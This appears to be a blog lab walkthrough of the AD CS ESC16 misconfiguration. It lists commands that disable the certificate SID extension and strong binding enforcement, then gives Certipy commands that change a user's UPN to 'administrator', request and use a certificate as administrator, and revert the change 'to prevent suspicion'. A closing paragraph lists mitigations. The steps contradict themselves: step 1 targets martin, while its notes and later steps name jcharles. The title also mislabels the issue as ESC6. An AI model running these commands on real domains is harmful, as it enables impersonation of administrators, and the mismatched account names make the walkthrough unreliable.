# 🔐 Active Directory Certificate Services (ADCS) - Enterprise CA Security Configuration 16 (ESC6) Abuse Guide


Misconfigurations in Active Directory Certificate Services (AD CS) can enable low-privileged users to escalate their privileges within an Active Directory environment. While there is limited detailed documentation available on **ESC16**, I decided to explore and document this specific attack path. This blog focuses on **ESC16**, a misconfiguration that weakens strong certificate mapping, potentially allowing attackers to impersonate privileged users through certificate-based authentication.

### ESC 16 Security Extension Disabled on CA (Globally):

ESC16 refers to a configuration flaw in Active Directory Certificate Services (AD CS) where the Certificate Authority (CA) is set to omit the `szOID_NTDS_CA_SECURITY_EXT` extension (OID: `1.3.6.1.4.1.311.25.2`) from all issued certificates. This extension, introduced in recent Windows updates, plays a crucial role in securely binding certificates to user or computer accounts through their unique Security Identifiers (SIDs).

The misconfiguration occurs when this OID is added to the CA’s `DisableExtensionList` registry key, located at:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>
```

When configured this way, the CA issues certificates without embedding the SID-based security extension. As a result, all templates published by this CA behave as though they explicitly disable the use of secure SID mappings, significantly weakening certificate-based authentication.

If Domain Controllers are not enforcing strict certificate mapping — specifically, if the `StrongCertificateBindingEnforcement` registry value is not set to 2 (Full Enforcement mode)—they fall back to older, less secure mapping techniques. These methods often rely on values like the User Principal Name (UPN) or DNS name found in the Subject Alternative Name (SAN) field of the certificate.

This weakened validation process creates an attack path where a low-privileged user can request a certificate impersonating a privileged account, bypassing SID-based verification and potentially escalating privileges within the Active Directory environment.

### Understanding szOID_NTDS_CA_SECURITY_EXT (OID: 1.3.6.1.4.1.311.25.2)

The `szOID_NTDS_CA_SECURITY_EXT` extension (OID: `1.3.6.1.4.1.311.25.2`) is a security feature used in Active Directory Certificate Services (AD CS). Internally referenced as `szOID_NTDS_CA_SECURITY_EXT<12>`, this extension is designed to embed the objectSid of the associated Active Directory object into the certificate being issued.

This extension is only considered by the Certificate Authority (CA) if the certificate template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled. It allows the CA to construct subject information for a certificate using data tied directly to an AD object, ensuring stronger identity binding.

### Understanding StrongCertificateBindingEnforcement and Its Impact When Not Configured

The `StrongCertificateBindingEnforcement` registry setting governs how strictly a domain controller validates the binding between a certificate and its associated Active Directory object during authentication. This mechanism is crucial for mitigating certificate-based impersonation attacks, particularly in environments impacted by misconfigurations like ESC16.

#### Modes of Enforcement

- **Compatibility Mode (default until February 2025)**
  When the May 10, 2022 security update is installed, domain controllers operate in Compatibility mode by default. In this mode, they continue to accept weaker, legacy certificate mappings — such as relying on the User Principal Name (UPN) or DNS name in the Subject Alternative Name — even if strong certificate mapping data is missing.

- **Enforcement Mode (starting February 2025)**
  Beginning February 2025, domain controllers will default to Full Enforcement mode if the StrongCertificateBindingEnforcementregistry key is not explicitly configured. In this mode, only certificates containing valid strong mapping attributes will be accepted for authentication. If a certificate lacks the required attributes, authentication will be denied.

### Regitry Key Configuration

The behavior of this enforcement is controlled by the following registry path:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc\
```

- `0` – **Disabled:** No strong mapping enforcement. Domain controllers rely entirely on legacy mappings.
- `1` – **Compatibility Mode:** Strong mappings are preferred, but fallback to legacy is allowed.
- `2` – **Full Enforcement:** Only certificates with valid strong mappings are accepted. Legacy mappings are rejected.


## Lab Environment Setup for Demonstrating ESC16 Exploitation

Disables the SAN restriction extension, allowing user-defined Subject Alternative Names in cert requests (ESC16 setup).

```
certutil -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.25.2
```

Verifies which certificate extensions are currently disabled by the CA.

```
certutil -getreg policy\DisableExtensionList
```

Stops and restart Certificate Authority service to apply registry configuration changes.

```
net stop certsvc
net start certsvc
```

<img src="Imgs/image1.png" alt="Error loading image">

Sets KDC to not enforce strong binding between certificates and accounts, which is required to exploit ESC16.

```
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kdc\Parameters" -Name "StrongCertificateBindingEnforcement" -Value 0
```

Verifies that the StrongCertificateBindingEnforcement registry value is set to 0 (disabled).

```
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kdc\Parameters" | Select-Object StrongCertificateBindingEnforcement
```

Restarts the KDC service to apply the updated binding enforcement setting.

```
Restart-Service kdc
```
<img src="Imgs/image2.png" alt="Error loading image">

To exploit ESC16, the user `jcharles` needs permission to modify the `userPrincipalName` (UPN) of another user, such as `martin`. By default, this is not allowed, and you'll see an error when trying to update it.

In **ADUC** (Active Directory Users and Computers):

- Go to Properties of user martin.
- Under the **Security tab → Advanced → Add**.

Grant jcharles `Write` permission on `martin`.

This simulates a misconfiguration where a low-privileged user has improper write access to another user’s attributes — sufficient to exploit ESC16.

<img src="Imgs/image3.png" alt="Error loading image">

## Enumerating AD CS for ESC16 Vulnerability

To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to ESC16, we use the powerful tool Certipy, developed by **Oliver Lyak (ly4k)**.

```
certipy find -u 'jcharles' -p 'complex1@' -dc-ip 192.168.129.140 -stdout -vulnerable
```

<img src="Imgs/image4.png" alt="Error loading image">

The output confirms the **ESC16 vulnerability**, indicating the extension `1.3.6.1.4.1.311.25.2` is disabled, which weakens the binding between certificates and user accounts — a prerequisite for abusing ESC16.


## Exploitation of ESC16 Vulnerability Using Certipy

Step 1: Update UserPrincipalName (UPN) of martin

Using the credentials of user jcharles, we update martin userPrincipalName to impersonate another user (administrator):

```
certipy account -u 'jcharles' -p 'complex1@' -target 'furious.local' -upn 'administrator' -user 'martin' update
```

- his modifies the userPrincipalName attribute for jcharles to administrator.
- Allows jcharles to request certificates for the administrator identity.

Step 2: Verify the Attribute Update

```
certipy account -u 'jcharles' -p 'complex1@' -dc-ip 192.168.129.140 -user 'jcharles' read
```

Confirms userPrincipalName is now set to administrator.

Step 3: Request Certificate as administrator

```
certipy req -dc-ip '192.168.129.140' -u 'administrator' -p 'complex1@' -target 'furious.local' -ca 'furious-DC01-FURIOUS5-CA' -template 'User'
```

Step 4: Revert the UPN Change

```
certipy account -u 'jcharles' -p 'complex1@' -target 'furious.local' -upn 'charles' -user 'jcharles' update
```

Reverts userPrincipalName back to prevent suspicion or disruption.


Step 5: Authenticate Using the Stolen Certificate

```
certipy auth -pfx administrator.pfx -domain furious.local -dc-ip 192.168.129.140
```

### Conclusion

The ESC16 vulnerability in Active Directory Certificate Services (AD CS) arises when the `szOID_NTDS_CA_SECURITY_EXT` extension is globally disabled, weakening the certificate-to-account binding and allowing legacy mappings like UPN or SAN to be used for authentication. This misconfiguration, combined with the absence of strict enforcement (`StrongCertificateBindingEnforcement` not set to 2), enables attackers with limited privileges to impersonate higher-privileged users by modifying their own userPrincipalName and requesting a forged certificate. Through tools like Certipy, attackers can identify and exploit this flaw to gain unauthorized access. To prevent such attacks, organizations must ensure strong certificate binding enforcement is enabled, the critical OID extension is not disabled, and certificate templates and user permissions are strictly audited and configured.


